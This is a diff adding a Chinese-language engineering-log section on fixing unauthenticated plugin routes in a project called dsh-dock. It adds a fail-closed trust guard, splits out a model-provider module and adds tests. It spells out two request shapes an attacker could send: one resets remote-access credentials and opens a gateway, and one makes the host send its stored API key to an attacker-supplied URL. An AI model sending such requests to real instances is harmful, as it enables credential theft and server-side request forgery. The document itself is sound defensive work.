@@ -2019,3 +2019,83 @@ enabled），但宿主没注册路由**。chip 每 10s、面板首页每 60s，�
   连带看一眼 `gap` 与内容是否换行（这里 12px 的 gap 正好是本例的补偿来源）。
 - **审计「有没有重叠」别只看 DOM 距离**，也别只信一次遍历：逐字符取矩形（`Range`）+
   排除被裁掉的元素，两个条件缺一个都会得到假阳性/假阴性。
+
+---
+
+## 二十二、续作会话（2026-10-14）· 插件路由信任栅栏 + 「模型提供商」拆成独立功能
+
+### 现象（安全缺口）
+
+承接「远程部署 + 账户体系」的讨论，逐层追到一条此前没人提过的洞：**dsh-dock 所有
+`webServer` 路由对任何能连到端口的人都是敞开的**——不需要登录，也不需要攻破登录页
+（`dsh-access` 这类门禁插件只有 exact 表 / fallback / connection-request / upgrades 四个缝，
+命名路由一个都不经过）。两条已确认可被利用的路径（代码可复现，未在真实实例上实际打过）：
+
+- `POST /dsh-dock/mobile-relay {method:'auth/set'|'lan/start'}`：改远程访问账号密码 + 开启
+  `0.0.0.0` 网关；网关随后会用 `connection.authenticatedUrl` 在服务端兑换出 **dsh 自己的会话
+  Cookie**（控制面暴露，不是数据泄露级别，但足以让攻击者在实例里落一颗钉子）。
+- `POST /dsh-dock/models {action:'listModels', baseURL:'<攻击者地址>', apiKeyEnv:'DEEPSEEK_API_KEY'}`：
+  宿主从本机凭据库取出**真 Key**，作为 `Authorization: Bearer` 发到调用方给的地址——
+  **模型 API Key 外带 + 任意 URL 出站（SSRF）**，全程无任何身份检查。
+
+### 根因
+
+`webServer` 的命名路由由载体直接派发给 handler，而载体「不拥有认证或 Origin 策略」
+（`packages/host/webserver` 的 handle：匹配到 route 就 `route.handler(req, res)`）；
+`/api` 的 Host/Origin 校验与会话认证由 Connection 在自己的 FetchHandler 上做，**管不到
+插件注册的命名路由**。所以「插件路由要不要鉴权」是插件自己的责任——官方
+`dsh-host-open-in-app`、`dsh-experimental-inspector` 都在入口调 `connection.requestRejection
+(req)`，而本仓库此前**全文一次都没调过**，且 `features/providerconfig` 还不存在时，
+`modelconfig` 的 `listModels` 就是一个典型的 confused deputy。
+
+### 改法
+
+1. **`src/host-core.js` 新增 `rejectUntrustedRequest(ctx, req, res)`**：内部取
+   `ctx.get('connection').requestRejection(req)`，非 `undefined` 就按该状态回
+   `{ ok:false, error:{ code:'untrusted' } }`（401 = Host 可信但无会话；403 = Host/Origin
+   栅栏拒绝），并 `req.resume()` 收掉未读正文；判定抛错也按 403 拒绝；**Connection 服务
+   不存在时 fail-closed 按 401 拒绝**（dsh-dock 的路由本身就是 web 专用）。
+2. **9 处 `webServer.register` 全部在 handler 第一行调用它**：`index.js` 的功能开关路由 +
+   8 个功能模块路由（`balance` / `animation` / `notify` / `runstate` / `tokenlog` /
+   `mobile-relay` / `modelconfig` / `providerconfig`；`mobile` 与 `visionproxy` 不注册路由，不涉及）。
+3. **拆出独立功能【模型提供商】**（`features/providerconfig/`，路由 `/dsh-dock/providerconfig`）：
+   Provider 增删改 + API Key 写入 + 拉取上游模型列表从「模型设置」整体迁走；「模型设置」
+   从此只管模型条目的输入模态与思考强度。理由是分工本身：前者是**配置面 + 出站请求**，
+   后者是模型元数据；拆开后不需要改 Provider 的部署可以把它整个停用，那三条路由一起卸载。
+   - 宿主共享层上提为 **`src/model-directory.js`**（目录归一化 + 条目整形），
+     `modelconfig` / `providerconfig` / `visionproxy` 三处共用；客户端共享层上提为
+     **`src/model-draft.js`**（草稿常量与纯函数），两个视图共用——避免各抄一份必然漂移。
+   - `scripts/extract-feature.mjs` 同步复制这两个共享文件。
+   - 客户端：「模型设置」去掉 Provider 入口卡与 `params.page="providers"` 子页面；
+     新模块自带页面（排版沿用官方「设置 → 模型」，深链 `params.openProviderForm` 保留）。
+   - `/dsh-dock/models` 的 GET 不再附带 `apiKeyConfigured`（移到新路由），模型设置页的
+     「有 N 个 Provider 未配置密钥」提示随功能迁走。
+4. **测试桩补信任面**：`test-task-host` / `test-tokenlog-host` / `test-mobile-relay-host` 的
+   ctx 桩加 `connection: { requestRejection: () => undefined }`（= 受信且已登录）。这不是
+   为了让测试变绿而放水：桩不提供信任面时新守卫会按 fail-closed 拒绝，正是期望行为。
+
+### 验证
+
+- 新增 `scripts/test-route-trust-host.mjs`（已串进 `npm run test:host`）：
+  - **静态**：扫描 `index.js` + `features/*/host.js` 的每一处 `webServer.register(`，
+    断言附近出现 `rejectUntrustedRequest(`——**防新路由漏挂**，当前 9 处；
+  - **行为**：401 / 403 / 栅栏缺失 fail-closed 三条路径都拒绝，且被拒绝的请求**不触到
+    `ctx.get('llm')`**（证明没进业务逻辑）；
+  - **模型提供商**：放行时 GET 返回 2 个 Provider + `apiKeyConfigured` + revision；
+    被拒绝的 create 不写 settings；非法 route / `ftp://` baseURL / 删除不存在的路由
+    分别 4xx 且不落盘。
+- `npm run test:host` 全绿（8 个用例文件）；`npm run build:client` + `npm run test:client`
+  全绿：**12 个内置功能视图**渲染正常、**9 个双半部模块**视图 id 与宿主 id 一致、
+  Provider 表单与列表两条断言迁到新模块。
+- 未做（留待真机）：真实实例上验证「无 Cookie 调 `/dsh-dock/*` 得 401/403」；截图重拍。
+
+### 经验
+
+- **载体不拥有认证 ⇒ 每个插件路由都要自证身份**。这类缺口不会有报错、不会被门禁插件兜住，
+  只能靠约定与契约测试；官方插件都调 `requestRejection` 就是现成的正确做法。
+- **「缺省放行」比「缺省拒绝」危险得多**：守卫在拿不到信任面时按 401 拒绝，测试桩被迫显式
+  提供 `connection`——如果反过来写成「探不到就放行」，测试会全绿而线上仍是敞开的门。
+- **拆分模块时先把共享逻辑上提到 `src/`**：`model-directory.js` / `model-draft.js` 两个
+  共享层让「两条入口写出的条目必须一致」变成结构性保证，而不是两处注释互相提醒。
+- **有出站请求或写凭据的路由，应该归属到可以整体停用的功能里**：拆完后「不改 Provider 的
+  部署」可以把配置面连同它的攻击面一起关掉。
